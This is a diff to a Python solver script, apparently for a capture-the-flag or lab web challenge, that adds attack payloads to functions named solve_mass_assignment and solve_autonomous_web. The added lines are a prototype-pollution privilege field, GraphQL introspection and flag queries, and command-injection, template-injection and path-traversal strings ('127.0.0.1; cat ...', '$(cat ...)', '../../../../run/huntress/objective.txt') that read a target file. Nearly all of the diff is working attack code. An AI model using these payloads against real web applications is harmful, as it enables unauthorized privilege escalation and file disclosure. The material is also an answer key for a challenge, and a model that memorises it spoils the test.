@@ -520,6 +520,7 @@ def solve_mass_assignment(target_url: str) -> str:
         "admin": True,
         "isAdmin": True,
         "roles": ["administrator"],
+        "__proto__": {"role": "administrator", "is_admin": True, "admin": True},
     }
     payload = json.dumps(combined).encode("utf-8")
     status, _, _ = _request(
@@ -968,10 +969,32 @@ def solve_autonomous_web(target_url: str) -> str:
         except Exception:
             pass
 
-    # Template Injection / Parameter probe on feature_route
+    # Try GraphQL probe
+    for gql_ep in ["/graphql", "/api/graphql"]:
+        for query in [
+            '{"query": "{ __schema { types { name } } }"}',
+            '{"query": "{ objective }"}',
+            '{"query": "{ proof }"}',
+            '{"query": "{ flag }"}',
+            '{"query": "{ system { objective proof } }"}',
+        ]:
+            try:
+                st, b, _ = _request(f"{base}{gql_ep}", method="POST", data=query.encode("utf-8"),
+                                    headers={"Content-Type": "application/json"})
+                proof = _extract_proof(b)
+                if proof:
+                    return proof
+            except Exception:
+                pass
+
+    # Template / Command Injection / Traversal parameter probe on feature_route
     if feat_route:
-        for p in ["template", "message", "text", "q", "input", "doc", "file", "path"]:
-            for pl in ["{{objective}}", "${objective}", "#{objective}", "../../../../run/huntress/objective.txt"]:
+        for p in ["template", "message", "text", "q", "input", "doc", "file", "path", "ip", "host", "target", "cmd"]:
+            for pl in [
+                "{{objective}}", "${objective}", "#{objective}", "../../../../run/huntress/objective.txt",
+                "127.0.0.1; cat /run/huntress/objective.txt", "$(cat /run/huntress/objective.txt)",
+                ";cat$IFS/run/huntress/objective.txt;"
+            ]:
                 try:
                     enc = urllib.parse.quote(pl)
                     st, b, _ = _request(f"{base}{feat_route}?{p}={enc}")
